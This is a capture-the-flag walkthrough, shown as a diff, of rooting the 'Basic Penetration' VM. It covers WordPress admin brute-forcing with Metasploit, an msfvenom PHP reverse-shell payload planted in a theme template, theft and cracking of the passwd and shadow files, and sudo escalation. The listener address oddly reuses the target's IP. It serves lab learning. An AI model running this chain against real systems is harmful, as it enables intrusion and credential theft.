@@ -1,0 +1,68 @@
+
+Hack the Basic Penetration VM (Boot2Root Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Basic Penetration. The credit for making this vm machine goes to “ Josiah Pierce” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.13 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -sT 192.168.1.13
+
+Nmap scan shows us port 80 is open, so we open ip address in our browser.
+
+We don’t find anything on the webpage we use nikto to find more information.
+nikto -h http://192.168.1.13
+
+We find a directory called secret/ we open it in our browser. We find that it is made of wordpress.
+
+We try to open the admin page but it wouldn’t open. When we look at the address bar of the browser. We find that we need to open the admin page using domain name.
+
+Now we add ‘vtcsec’ to hosts file, the hosts file is in /etc/ folder. We add the ip-address of the VM and the domain name.
+
+Now when we open the admin page we can access it. We find that the username is admin. We now brute force the password using this username.
+
+We use metasploit to brute force wordpress admin login.
+msf > use auxiliary/scanner/http/wordpress_login_enum
+msf auxiliary(wordpress_login_enum) > set username admin
+msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordlists/dirb/common.txt
+msf auxiliary(wordpress_login_enum) > set targeturi /secret/
+msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.13
+msf auxiliary(wordpress_login_enum) > run
+
+We find that the password to the admin panel is “admin”. Now we use username and password as ‘admin’ to access the admin panel. After getting the admin panel we move to 404-template in themes. We change the source code of 404-template with our metasploit shell.
+
+Now we create php shell using msfvenom to replace the 404-template.
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.13 lport=4444 -f raw
+
+Now we copy the php code from <?php to die(); and and replace the 404-template with it.
+
+Now we setup or listener using metasploit.
+msf > use multi/handler
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.13
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > run
+
+Now when we run the shell we get the reverse connection. To execute the code, we open the url.
+http://vtcsec/secret/wp-content/templates/twentyseventeen/404.php
+As soon as we execute the code we get reverse shell.
+
+After getting the reverse shell we find that we can access both shadow and passwd file. So we download both of them into our system.
+
+Now we use unshadow (a utility of john the ripper) to mix merge passwd and shadow file into one file.
+unshadow passwd shadow > cracked
+
+Now we use john the ripper to crack the password.
+john cracked
+We find the password to be ‘marlinspike’ for user ‘marlinspike’
+
+Now we login as marlinspike.
+su – marlinspike
+
+We check the sudoers list and find that we have all the access same as root so we now spawn bash as root.
+sudo -l
+sudo bash
+Now we are a root user.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
